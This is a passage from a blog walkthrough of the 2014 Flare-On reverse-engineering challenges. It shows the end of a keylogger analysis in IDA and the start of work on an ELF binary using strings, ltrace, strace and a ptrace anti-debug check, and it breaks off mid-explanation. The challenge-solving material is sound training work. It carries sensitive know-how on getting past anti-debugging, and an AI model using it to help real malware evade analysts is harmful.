</span></span><span style=display:flex><span>.text:1000<span style=color:#268bd2>A1BF</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_10009AF0</span></span></span></code></pre></td></tr></table></div></div></div></figure><p>What is <code>sub_10009AF0</code>?</p><p><img src=/images/2014/flare/5-6.jpg alt=sub10009Af0 title=sub10009AF0></p><p>Nice, IDA has even tagged it as M for us. First we see that a <code>dword_10017000</code> is compared to 0. and if it is larger than 0, two functions are called: <code>__cfltcvt_init</code> and <code>sub_10001240</code>. Then returns with value <code>m</code>.</p><p><img src=/images/2014/flare/5-7.jpg alt=__cfltcvt_init title=__cfltcvt_init></p><p><code>__cfltcvt_init</code> sets one variable to 1 and resets the rest (including <code>dword_10017000</code>).</p><p><code>sub_10001240</code> creates a large array, initializes it with some values and then calles <code>GetWindowLong</code> and <code>DialogBoxIndirectParam</code>. I put a breakpoint in the end. Change the IP to the start of this function and ran the program.</p><p><img src=/images/2014/flare/5-8.jpg alt="ASCII Flare" title="ASCII Flare"></p><p>Nice! So to get this ASCII art we have to press M and <code>dword_10017000</code> needs to be 0. Let's get back to <code>sub_10009AF0</code> and investigate <code>dword_10017000</code>.</p><p>Highlight <code>dword_10017000</code> and press <code>x</code> in IDA to see where this variable is being set to 1 (which will make the if true). There is only one place.</p><p><img src=/images/2014/flare/5-9.jpg alt="Where M is set" title="Where M is set"></p><p>Notice the <code>o</code>? Now see that variable <code>dword_100194F8</code> needs to be 1 to reach this line (top right). Follow that using <code>x</code>.</p><p>So we have <code>m</code> and then <code>o</code>. If we follow the chain and then reverse it, we have the flag. The binary is a keylogger, it saves all keystrokes to <code>svchost.log</code>.</p><h4 id=level-5-flag>Level 5 flag: <a href=mailto:l0gging.Ur.5tr0ke5@flare-on.com>l0gging.Ur.5tr0ke5@flare-on.com</a>
<a class=header-link href=#level-5-flag><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h4><hr><h2 id=challenge-6---ida-appreciation-day><a name=ch6></a>Challenge 6 - IDA Appreciation Day
<a class=header-link href=#challenge-6---ida-appreciation-day><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><pre tabindex=0><code>Great success!
We&#39;ve got another evil one for you, see if you can figure this out. This one will be rougher. Good luck!
-FLARE
</code></pre><p>While I was writing this solution, I saw this alternative way of solving the challenge. Great read: <a href=http://gaasedelen.blogspot.com/2014/09/solving-fireeyes-flare-on-six-via-side.html target=_blank rel="noreferrer noopener">Solving FireEye's Flare On Six via Side Channels</a>.</p><p>New binary. Named <code>e7bc5d2c0cf4480348f5504196561297</code>. Let's google it and <a href=http://pedump.me/e7bc5d2c0cf4480348f5504196561297/ target=_blank rel="noreferrer noopener">first result</a> is interesting. Filename has the <code>exe</code> extension but it is a 64-bit ELF executable. Opening the file in <code>HxD</code> shows us the ELF magic bytes.</p><figure class=code><figcaption><span>Info from pedumpme</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">4
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>filename  spyEye1.4.exe
</span></span><span style=display:flex><span>size      <span style=color:#2aa198>1221064</span> <span style=color:#719e07>(</span>0x12a1c8<span style=color:#719e07>)</span>
</span></span><span style=display:flex><span>md5       e7bc5d2c0cf4480348f5504196561297
</span></span><span style=display:flex><span><span style=color:#b58900>type</span>      ELF 64-bit LSB executable, x86-64, version <span style=color:#2aa198>1</span> <span style=color:#719e07>(</span>SYSV<span style=color:#719e07>)</span>, statically linked, <span style=color:#719e07>for</span> GNU/Linux 2.6.24, BuildID<span style=color:#719e07>[</span>sha1<span style=color:#719e07>]=</span>0xa26451c6440ccb470f9cb8cabf8069c01120086c, stripped</span></span></code></pre></td></tr></table></div></div></div></figure><p>I started a Kali 64-bit VM in VirtualBox. Less mess with it a bit. I used IDA Remote Linux Debugger. IDA was running on my host OS and the binary was in the Kali 64-bit VM.</p><figure class=code><figcaption><span>Running commands</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">41
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#586e75># the same as the website</span>
</span></span><span style=display:flex><span>$ file e7bc5d2c0cf4480348f5504196561297
</span></span><span style=display:flex><span>e7bc5d2c0cf4480348f5504196561297: ELF 64-bit LSB executable, x86-64, version <span style=color:#2aa198>1</span> <span style=color:#719e07>(</span>SYSV<span style=color:#719e07>)</span>, statically linked, <span style=color:#719e07>for</span> GNU/Linux 2.6.24, BuildID<span style=color:#719e07>[</span>sha1<span style=color:#719e07>]=</span>0xa26451c6440ccb470f9cb8cabf8069c01120086c, stripped
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ strings e7bc5d2c0cf4480348f5504196561297
</span></span><span style=display:flex><span><span style=color:#586e75># results in a bunch of random strings</span>
</span></span><span style=display:flex><span><span style=color:#586e75># looks like a mix of error messages, source code and random words</span>
</span></span><span style=display:flex><span>/index.html
</span></span><span style=display:flex><span>Nosebleed   <span style=color:#586e75># Heartbleed eh? :)</span>
</span></span><span style=display:flex><span>../nptl/sysdeps/unix/sysv/linux/x86_64/../fork.c
</span></span><span style=display:flex><span>info<span style=color:#719e07>[</span>20<span style=color:#719e07>]</span>-&gt;d_un.d_val <span style=color:#719e07>==</span> <span style=color:#2aa198>7</span>
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#586e75># let&#39;s see shared library calls - nope</span>
</span></span><span style=display:flex><span>$ ltrace ./e7bc5d2c0cf4480348f5504196561297
</span></span><span style=display:flex><span>ltrace: Couldn<span style=color:#2aa198>&#39;t find .dynsym or .dynstr in &#34;./e7bc5d2c0cf4480348f5504196561297&#34;
</span></span></span><span style=display:flex><span><span style=color:#2aa198>
</span></span></span><span style=display:flex><span><span style=color:#2aa198># Let&#39;</span>s run the binary manually
</span></span><span style=display:flex><span><span style=color:#586e75># running it normally</span>
</span></span><span style=display:flex><span>$ ./e7bc5d2c0cf4480348f5504196561297
</span></span><span style=display:flex><span>no
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#586e75># one argument - different message</span>
</span></span><span style=display:flex><span>$ ./e7bc5d2c0cf4480348f5504196561297 arg1
</span></span><span style=display:flex><span>na
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#586e75># longer argument - message did not change</span>
</span></span><span style=display:flex><span>$ ./e7bc5d2c0cf4480348f5504196561297 arg11111
</span></span><span style=display:flex><span>na
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#586e75># two arguments - message changed</span>
</span></span><span style=display:flex><span>$ ./e7bc5d2c0cf4480348f5504196561297 arg11111 arg2
</span></span><span style=display:flex><span>bad
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#586e75># three arguments - message changed - shoule we stop?</span>
</span></span><span style=display:flex><span>$ ./e7bc5d2c0cf4480348f5504196561297 arg11111 arg2 arg3
</span></span><span style=display:flex><span>stahp
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#586e75># four arguments - message is the same - we should stop</span>
</span></span><span style=display:flex><span>$ ./e7bc5d2c0cf4480348f5504196561297 arg11111 arg2 arg3 arg4
</span></span><span style=display:flex><span>stahp</span></span></code></pre></td></tr></table></div></div></div></figure><p>I did not try executing the binary with different number of arguments at the start. I tried different argument lengths, really long arguments (e.g. 'A'*40000). In the end I decided that two arguments was the correct way to run the binary. While debugging I realized that the binary crashes with a segfault message. While it is fine without the debugging. So some anti-debugging protections must be at work. We ran <code>ltrace</code> and didn't see any shared library calls. Let's run <code>strace</code> to get system calls.</p><figure class=code><figcaption><span>strace output</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">41
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ strace ./e7bc5d2c0cf4480348f5504196561297
</span></span><span style=display:flex><span>execve<span style=color:#719e07>(</span><span style=color:#2aa198>&#34;./e7bc5d2c0cf4480348f5504196561297&#34;</span>, <span style=color:#719e07>[</span><span style=color:#2aa198>&#34;./e7bc5d2c0cf4480348f55041965612&#34;</span>...<span style=color:#719e07>]</span>, <span style=color:#719e07>[</span>/* <span style=color:#2aa198>31</span> vars */<span style=color:#719e07>])</span> <span style=color:#719e07>=</span> <span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span>uname<span style=color:#719e07>({</span><span style=color:#268bd2>sys</span><span style=color:#719e07>=</span><span style=color:#2aa198>&#34;Linux&#34;</span>, <span style=color:#268bd2>node</span><span style=color:#719e07>=</span><span style=color:#2aa198>&#34;kali&#34;</span>, ...<span style=color:#719e07>})</span>  <span style=color:#719e07>=</span> <span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span>brk<span style=color:#719e07>(</span>0<span style=color:#719e07>)</span>                                  <span style=color:#719e07>=</span> 0x13e5000
</span></span><span style=display:flex><span>brk<span style=color:#719e07>(</span>0x13e61c0<span style=color:#719e07>)</span>                          <span style=color:#719e07>=</span> 0x13e61c0
</span></span><span style=display:flex><span>arch_prctl<span style=color:#719e07>(</span>ARCH_SET_FS, 0x13e5880<span style=color:#719e07>)</span>      <span style=color:#719e07>=</span> <span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span>brk<span style=color:#719e07>(</span>0x14071c0<span style=color:#719e07>)</span>                          <span style=color:#719e07>=</span> 0x14071c0
</span></span><span style=display:flex><span>brk<span style=color:#719e07>(</span>0x1408000<span style=color:#719e07>)</span>                          <span style=color:#719e07>=</span> 0x1408000
</span></span><span style=display:flex><span>fstat<span style=color:#719e07>(</span>1, <span style=color:#719e07>{</span><span style=color:#268bd2>st_mode</span><span style=color:#719e07>=</span>S_IFCHR|0620, <span style=color:#268bd2>st_rdev</span><span style=color:#719e07>=</span>makedev<span style=color:#719e07>(</span>136, 0<span style=color:#719e07>)</span>, ...<span style=color:#719e07>})</span> <span style=color:#719e07>=</span> <span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span>mmap<span style=color:#719e07>(</span>NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0<span style=color:#719e07>)</span> <span style=color:#719e07>=</span> 0x7f20ba6fb000
</span></span><span style=display:flex><span>write<span style=color:#719e07>(</span>1, <span style=color:#2aa198>&#34;no\n&#34;</span>, 3no
</span></span><span style=display:flex><span><span style=color:#719e07>)</span>                     <span style=color:#719e07>=</span> <span style=color:#2aa198>3</span>
</span></span><span style=display:flex><span>exit_group<span style=color:#719e07>(</span>52<span style=color:#719e07>)</span>                          <span style=color:#719e07>=</span> ?
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ strace ./e7bc5d2c0cf4480348f5504196561297 arg1
</span></span><span style=display:flex><span>execve<span style=color:#719e07>(</span><span style=color:#2aa198>&#34;./e7bc5d2c0cf4480348f5504196561297&#34;</span>, <span style=color:#719e07>[</span><span style=color:#2aa198>&#34;./e7bc5d2c0cf4480348f55041965612&#34;</span>..., <span style=color:#2aa198>&#34;arg1&#34;</span><span style=color:#719e07>]</span>, <span style=color:#719e07>[</span>/* <span style=color:#2aa198>31</span> vars */<span style=color:#719e07>])</span> <span style=color:#719e07>=</span> <span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span>uname<span style=color:#719e07>({</span><span style=color:#268bd2>sys</span><span style=color:#719e07>=</span><span style=color:#2aa198>&#34;Linux&#34;</span>, <span style=color:#268bd2>node</span><span style=color:#719e07>=</span><span style=color:#2aa198>&#34;kali&#34;</span>, ...<span style=color:#719e07>})</span>  <span style=color:#719e07>=</span> <span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span>brk<span style=color:#719e07>(</span>0<span style=color:#719e07>)</span>                                  <span style=color:#719e07>=</span> 0x18cb000
</span></span><span style=display:flex><span>brk<span style=color:#719e07>(</span>0x18cc1c0<span style=color:#719e07>)</span>                          <span style=color:#719e07>=</span> 0x18cc1c0
</span></span><span style=display:flex><span>arch_prctl<span style=color:#719e07>(</span>ARCH_SET_FS, 0x18cb880<span style=color:#719e07>)</span>      <span style=color:#719e07>=</span> <span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span>brk<span style=color:#719e07>(</span>0x18ed1c0<span style=color:#719e07>)</span>                          <span style=color:#719e07>=</span> 0x18ed1c0
</span></span><span style=display:flex><span>brk<span style=color:#719e07>(</span>0x18ee000<span style=color:#719e07>)</span>                          <span style=color:#719e07>=</span> 0x18ee000
</span></span><span style=display:flex><span>fstat<span style=color:#719e07>(</span>1, <span style=color:#719e07>{</span><span style=color:#268bd2>st_mode</span><span style=color:#719e07>=</span>S_IFCHR|0620, <span style=color:#268bd2>st_rdev</span><span style=color:#719e07>=</span>makedev<span style=color:#719e07>(</span>136, 0<span style=color:#719e07>)</span>, ...<span style=color:#719e07>})</span> <span style=color:#719e07>=</span> <span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span>mmap<span style=color:#719e07>(</span>NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0<span style=color:#719e07>)</span> <span style=color:#719e07>=</span> 0x7ffd41ca2000
</span></span><span style=display:flex><span>write<span style=color:#719e07>(</span>1, <span style=color:#2aa198>&#34;na\n&#34;</span>, 3na
</span></span><span style=display:flex><span><span style=color:#719e07>)</span>                     <span style=color:#719e07>=</span> <span style=color:#2aa198>3</span>
</span></span><span style=display:flex><span>exit_group<span style=color:#719e07>(</span>423<span style=color:#719e07>)</span>                         <span style=color:#719e07>=</span> ?
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ strace ./e7bc5d2c0cf4480348f5504196561297 arg1 arg2
</span></span><span style=display:flex><span>execve<span style=color:#719e07>(</span><span style=color:#2aa198>&#34;./e7bc5d2c0cf4480348f5504196561297&#34;</span>, <span style=color:#719e07>[</span><span style=color:#2aa198>&#34;./e7bc5d2c0cf4480348f55041965612&#34;</span>..., <span style=color:#2aa198>&#34;arg1&#34;</span>, <span style=color:#2aa198>&#34;arg2&#34;</span><span style=color:#719e07>]</span>, <span style=color:#719e07>[</span>/* <span style=color:#2aa198>31</span> vars */<span style=color:#719e07>])</span> <span style=color:#719e07>=</span> <span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span>uname<span style=color:#719e07>({</span><span style=color:#268bd2>sys</span><span style=color:#719e07>=</span><span style=color:#2aa198>&#34;Linux&#34;</span>, <span style=color:#268bd2>node</span><span style=color:#719e07>=</span><span style=color:#2aa198>&#34;kali&#34;</span>, ...<span style=color:#719e07>})</span>  <span style=color:#719e07>=</span> <span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span>brk<span style=color:#719e07>(</span>0<span style=color:#719e07>)</span>                                  <span style=color:#719e07>=</span> 0x128d000
</span></span><span style=display:flex><span>brk<span style=color:#719e07>(</span>0x128e1c0<span style=color:#719e07>)</span>                          <span style=color:#719e07>=</span> 0x128e1c0
</span></span><span style=display:flex><span>arch_prctl<span style=color:#719e07>(</span>ARCH_SET_FS, 0x128d880<span style=color:#719e07>)</span>      <span style=color:#719e07>=</span> <span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span>brk<span style=color:#719e07>(</span>0x12af1c0<span style=color:#719e07>)</span>                          <span style=color:#719e07>=</span> 0x12af1c0
</span></span><span style=display:flex><span>brk<span style=color:#719e07>(</span>0x12b0000<span style=color:#719e07>)</span>                          <span style=color:#719e07>=</span> 0x12b0000
</span></span><span style=display:flex><span>ptrace<span style=color:#719e07>(</span>PTRACE_TRACEME, 0, 0x1, 0<span style=color:#719e07>)</span>       <span style=color:#719e07>=</span> -1 EPERM <span style=color:#719e07>(</span>Operation not permitted<span style=color:#719e07>)</span>
</span></span><span style=display:flex><span>fstat<span style=color:#719e07>(</span>1, <span style=color:#719e07>{</span><span style=color:#268bd2>st_mode</span><span style=color:#719e07>=</span>S_IFCHR|0620, <span style=color:#268bd2>st_rdev</span><span style=color:#719e07>=</span>makedev<span style=color:#719e07>(</span>136, 0<span style=color:#719e07>)</span>, ...<span style=color:#719e07>})</span> <span style=color:#719e07>=</span> <span style=color:#2aa198>0</span>
</span></span><span style=display:flex><span>mmap<span style=color:#719e07>(</span>NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0<span style=color:#719e07>)</span> <span style=color:#719e07>=</span> 0x7fba3fee7000
</span></span><span style=display:flex><span>write<span style=color:#719e07>(</span>1, <span style=color:#2aa198>&#34;Program received signal SIGSEGV,&#34;</span>..., 52Program received signal SIGSEGV, Segmentation fault<span style=color:#719e07>)</span> <span style=color:#719e07>=</span> <span style=color:#2aa198>52</span>
</span></span><span style=display:flex><span>exit_group<span style=color:#719e07>(</span>9001<span style=color:#719e07>)</span>                        <span style=color:#719e07>=</span> ?</span></span></code></pre></td></tr></table></div></div></div></figure><p>Syscalls are similar in all traces except with two arguments. We can see that <code>ptrace</code> is being called in line 37. It's a common <a href=http://reverseengineering.stackexchange.com/a/1931 target=_blank rel="noreferrer noopener">anti-debug protection</a> in Linux. "[a]n executable can only call ptrace once. if ptrace() was already called by the strace executable, we can detect it in runtime." So we need to bypass <code>ptrace</code>. Searching for <code>ptrace</code> in IDA does not turn up anything. I learned that syscalls are not called that way by name (he he). The argument for <code>syscall</code> is moved to <code>eax</code> and then it is called. So I search for the text <code>syscall</code> in IDA and then commented each call according to <a href=http://blog.rchapman.org/post/36801038863/linux-system-call-table-for-x86-64 target=_blank rel="noreferrer noopener">Linux System Call Table for x86_64</a> by <code>@pixnbits</code>. <code>ptrace</code> is <code>0x65</code>:</p><p><img src=/images/2014/flare/6-1.jpg alt="ptrace call" title="ptrace call"></p><p>Later I realized there was a much easier way to find it instead of discovering all calls. Running <code>strace</code> with <code>-i</code> switch will print the instruction pointer <del>at the time of call</del> after the syscall returns. Let's run 